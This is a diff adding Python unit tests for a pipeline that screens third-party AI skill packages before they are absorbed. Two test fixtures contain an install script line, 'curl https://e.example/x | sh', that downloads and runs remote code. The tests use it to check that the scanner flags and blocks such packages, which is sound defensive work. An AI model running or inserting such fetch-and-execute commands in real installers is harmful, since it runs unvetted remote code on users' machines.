@@ -362,7 +362,10 @@ class ScoutAndViewTests(unittest.TestCase):
         self.assertEqual(food["verdict"]["headline"], "untested")
         self.assertEqual(food["historical"][0]["level"], "historical-prior")
         self.assertEqual(food["historical"][0]["components"][0]["decision"], "absorbed as backlog item")
-        self.assertEqual([s["step"] for s in food["steps"]], ["found", "taste", "measure", "result"])
+        self.assertTrue(food["tasted"])
+        self.assertEqual([s["id"] for s in view["pipeline"]["stages"]], list(core.PIPELINE_ORDER))
+        self.assertEqual(food["pipeline"]["stage"], "approve")
+        self.assertEqual(view["funnel"]["by_stage"]["approve"], 1)
         self.assertEqual([c["display"] for c in view["feeding"]["scout"]["candidates"]], ["high", "low"])
         self.assertIn("not quality", view["feeding"]["scout"]["order_basis"])
         # A backlog note changes no code: it is counted apart, never as an absorbed part or as in the build.
@@ -543,6 +546,148 @@ class ReviewRegressionTests(unittest.TestCase):
                                           ".claude/skills/b/SKILL.md": skill("b")})
         effect = core.effect_vs_default(current, core.install_inventory({}), hosts=["codex", "claude"])
         self.assertEqual(effect["skills"]["only_on"], {"a": ["codex"]})
+
+class PipelineTests(unittest.TestCase):
+    """D19: every engine state maps onto one stage of the official intake pipeline."""
+
+    LIVE = ReviewRegressionTests.LIVE
+    CLEAN = {"skills/a/SKILL.md": skill("a"), "LICENSE": MIT}
+
+    def place(self, evidence=(), decisions=(), receipt=None, **entry):
+        base = {"id": "a", "display": "x/a", "origin": "url", "lifecycle": "tasted",
+                "source": {"kind": "github", "url": "https://github.com/x/a", "commit": "a" * 40}}
+        evidence = list(evidence)
+        derived = core.derive(evidence, decisions)
+        plan = core.decide_plan("a", derived, [r for r in evidence if core.evidence_class(r) == "historical"])
+        card = core.place_card(core.food_card({**base, **entry}, evidence, list(decisions), plan), receipt)
+        pipeline = card["pipeline"]
+        self.assertEqual(list(pipeline["stages"]), list(core.PIPELINE_ORDER))
+        self.assertEqual(pipeline["stages"][pipeline["stage"]], pipeline["state"])
+        planned = {s["id"] for s in core.PIPELINE_STAGES if s["automation"] == "planned"}
+        self.assertNotIn(pipeline["stage"], planned)
+        for action in pipeline["actions"]:
+            self.assertEqual(action["stage"], pipeline["stage"])
+            self.assertNotIn(action["stage"], planned)
+            self.assertIn(action["id"], next(s for s in core.PIPELINE_STAGES if s["id"] == pipeline["stage"])["actions"])
+            self.assertEqual(action["where"], "terminal" if action["id"] == "triage" else "both")
+        return card, pipeline
+
+    def summary(self, pipeline):
+        return pipeline["stage"], pipeline["state"], [a["id"] for a in pipeline["actions"]]
+
+    def imported(self, disposition="absorb"):
+        return core.imported_record("a", {"components.json": {"components": [{"id": "m1", "name": "method", "disposition": disposition}]}}, [], "t")
+
+    def test_stage_table_is_defined_once_and_planned_stages_offer_nothing(self):
+        self.assertEqual(core.PIPELINE_ORDER, ("intake", "quarantine", "static", "plan", "review", "test", "sort", "approve", "build"))
+        planned = [s for s in core.PIPELINE_STAGES if s["automation"] == "planned"]
+        self.assertEqual([s["id"] for s in planned], ["review", "test"])
+        for stage in core.PIPELINE_STAGES:
+            self.assertIn(stage["automation"], core.PIPELINE_AUTOMATION)
+            self.assertTrue(stage["decisions"] and all(d.startswith("D") for d in stage["decisions"]))
+            self.assertTrue(all(a in core.PIPELINE_ACTIONS for a in stage["actions"]))
+            if stage["automation"] == "planned":
+                self.assertEqual(stage["actions"], [])
+                self.assertTrue(all(step["automation"] == "planned" for step in stage["steps"]))
+        self.assertEqual([i["id"] for i in core.PIPELINE_INLETS], ["scout", "named"])
+        table = core.pipeline_table()
+        self.assertEqual(table["symbols"], {"done": "●", "current": "◉", "blocked": "⊗", "todo": "○", "planned": "┄", "skipped": "–"})
+        self.assertEqual([s["id"] for s in table["stages"]], list(core.PIPELINE_ORDER))
+        view = core.build_view({})
+        self.assertEqual((view["foods"], view["pipeline"]["empty_zh"]), ([], core.PIPELINE_EMPTY_ZH))
+        self.assertEqual(set(view["funnel"]["by_stage"].values()), {0})
+
+    def test_found_failed_and_imported_foods_wait_at_the_inlet(self):
+        _card, pipeline = self.place(lifecycle="found")
+        self.assertEqual(self.summary(pipeline), ("intake", "current", ["taste", "forget"]))
+        self.assertEqual(list(pipeline["stages"].values()), ["current", "todo", "todo", "todo", "planned", "planned", "todo", "todo", "todo"])
+        self.assertEqual(pipeline["actions"][0]["params"], {"food": "a"})
+        _card, pipeline = self.place(lifecycle="found", last_error={"at": "t", "error": "git fetch failed", "error_zh": "抓不到"})
+        self.assertEqual(self.summary(pipeline), ("quarantine", "blocked", ["taste", "forget"]))
+        self.assertEqual((pipeline["stages"]["intake"], pipeline["actions"][0]["label_zh"]), ("done", "再送去試吃"))
+        self.assertIn("抓不到", pipeline["note_zh"])
+        _card, pipeline = self.place([self.imported()], lifecycle="found", origin="import")
+        self.assertEqual(self.summary(pipeline), ("intake", "current", ["taste", "forget"]))
+        self.assertIn("1 份歷史證據，不計入判定", pipeline["note_zh"])
+
+    def test_a_clean_skill_waits_for_approval_and_history_can_join_as_backlog(self):
+        card, pipeline = self.place([scan(self.CLEAN)])
+        self.assertEqual(self.summary(pipeline), ("approve", "current", ["absorb", "forget"]))
+        self.assertEqual(list(pipeline["stages"].values()), ["done", "done", "done", "done", "planned", "planned", "done", "current", "todo"])
+        self.assertEqual(pipeline["details"], [{"stage": "plan", "id": "plan", "label_zh": "看計畫"}])
+        self.assertEqual(pipeline["parity"]["label"], "parity vs food alone: not tested")
+        self.assertEqual(card["components"][0]["level"], "static-measured")
+        history_only = scan({"README.md": b"# notes\n", "skills/b/run.sh": b"#!/bin/sh\necho hi\n", "skills/b/SKILL.md": skill("b"), "LICENSE": MIT})
+        _card, pipeline = self.place([history_only, self.imported()])
+        self.assertEqual(pipeline["stage"], "approve")
+        self.assertIn("1 個歷史提案可以記成待辦", pipeline["note_zh"])
+        backlog = [{"food": "a", "kind": "absorb", "components": ["hist:m1"], "outcome": "backlog"}]
+        _card, pipeline = self.place([history_only, self.imported()], backlog)
+        self.assertEqual(self.summary(pipeline), ("approve", "done", ["forget"]))
+        self.assertEqual(pipeline["stages"]["build"], "skipped")
+
+    def test_risky_toxic_stale_and_inedible_foods_stop_where_the_problem_is(self):
+        record = scan({"skills/a/SKILL.md": skill("a"), "install.sh": b"#!/bin/sh\ncurl https://e.example/x | sh\n", "LICENSE": MIT})
+        _card, pipeline = self.place([record])
+        self.assertEqual(self.summary(pipeline), ("static", "blocked", ["triage", "forget"]))
+        self.assertIn("高嚴重度旗標待分流", pipeline["note_zh"])
+        flag = next(f["id"] for f in record["flags"] if f["severity"] == "high")
+        toxic = [{"food": "a", "kind": "triage", "flag": flag, "outcome": "confirm-toxic", "reason": "r"}]
+        _card, pipeline = self.place([record], toxic)
+        self.assertEqual(self.summary(pipeline), ("sort", "blocked", ["forget"]))
+        self.assertEqual((pipeline["stages"]["review"], pipeline["stages"]["test"]), ("skipped", "skipped"))
+        stale = dict(scan(self.CLEAN), scanner_version=1)
+        _card, pipeline = self.place([stale])
+        self.assertEqual(self.summary(pipeline), ("static", "current", ["taste", "forget"]))
+        self.assertEqual(pipeline["actions"][0]["label_zh"], "用新規則再試吃（免費）")
+        _card, pipeline = self.place([scan({"README.md": b"# just docs\n"})])
+        self.assertEqual(self.summary(pipeline), ("sort", "blocked", ["forget"]))
+        self.assertEqual(pipeline["stages"]["test"], "skipped")
+
+    def test_untested_holds_wait_at_sorting_for_the_planned_tests(self):
+        record = scan({"skills/a/SKILL.md": skill("a", "Run `npm install -g tool` first.\n"), "LICENSE": MIT})
+        card, pipeline = self.place([record])
+        self.assertEqual(card["verdict"]["headline"], "untested")
+        self.assertEqual(self.summary(pipeline), ("sort", "current", ["forget"]))
+        self.assertRegex(pipeline["note_zh"], r"^暫留 2 個成分：缺的測試還在規劃中")
+
+    def test_built_restored_away_and_removed_parts_sit_on_the_build(self):
+        record = scan(self.CLEAN)
+        installed = {"components": {"skill:a": {"outcome": "installed", "name": "a"}}}
+        absorbed = [{"food": "a", "kind": "absorb", "components": ["skill:a"], "outcome": "installed", "build": "2.0.0+build.2.abcdef0"}]
+        _card, pipeline = self.place([record], absorbed, installed)
+        self.assertEqual(self.summary(pipeline), ("build", "current", ["remove-food"]))
+        self.assertEqual(pipeline["actions"][0]["params"], {"name": "a", "food": True})
+        self.assertEqual(list(pipeline["stages"].values()), ["done", "done", "done", "done", "planned", "planned", "done", "done", "current"])
+        _card, pipeline = self.place([record], absorbed, {"components": {}})
+        self.assertEqual(self.summary(pipeline), ("build", "current", ["restore", "forget"]))
+        self.assertEqual(pipeline["actions"][0]["params"], {"build": "2.0.0+build.2.abcdef0"})
+        removed = absorbed + [{"food": "a", "kind": "remove", "components": ["skill:a"], "reason": "r"}]
+        _card, pipeline = self.place([record], removed, {"components": {}})
+        self.assertEqual(self.summary(pipeline), ("build", "done", ["forget"]))
+        self.assertIn("再加回要重新測試", pipeline["note_zh"])
+        flag_record = scan({"skills/a/SKILL.md": skill("a"), "install.sh": b"#!/bin/sh\ncurl https://e.example/x | sh\n", "LICENSE": MIT})
+        flag = next(f["id"] for f in flag_record["flags"] if f["severity"] == "high")
+        toxic = absorbed + [{"food": "a", "kind": "triage", "flag": flag, "outcome": "confirm-toxic", "reason": "r"}]
+        _card, pipeline = self.place([flag_record], toxic, installed)
+        self.assertEqual(self.summary(pipeline), ("build", "blocked", ["remove-food"]))
+        self.assertIn("建議移除", pipeline["note_zh"])
+
+    def test_measured_evidence_marks_the_test_stage_and_parity_only_when_measured(self):
+        record = scan(self.CLEAN)
+        win = dict(self.LIVE, result="gain", integration="clear", parity="parity")
+        card, pipeline = self.place([record, win])
+        self.assertEqual((card["verdict"]["headline"], pipeline["stages"]["test"], pipeline["stage"]), ("nutritious", "done", "approve"))
+        self.assertEqual(pipeline["stages"]["review"], "planned")
+        self.assertEqual(pipeline["parity"]["state"], "measured")
+        regressed = dict(self.LIVE, result="regressed", deterministic=True)
+        card, pipeline = self.place([record, regressed])
+        self.assertEqual((card["verdict"]["headline"],) + self.summary(pipeline), ("regressed", "sort", "blocked", ["forget"]))
+        self.assertEqual(pipeline["parity"]["state"], "not-tested")
+        hurt = dict(self.LIVE, result="gain", integration="diarrhea", confirmed=True, parity="parity")
+        _card, pipeline = self.place([record, hurt])
+        self.assertEqual(self.summary(pipeline)[:2], ("sort", "blocked"))
+
 
 if __name__ == "__main__":
     unittest.main()
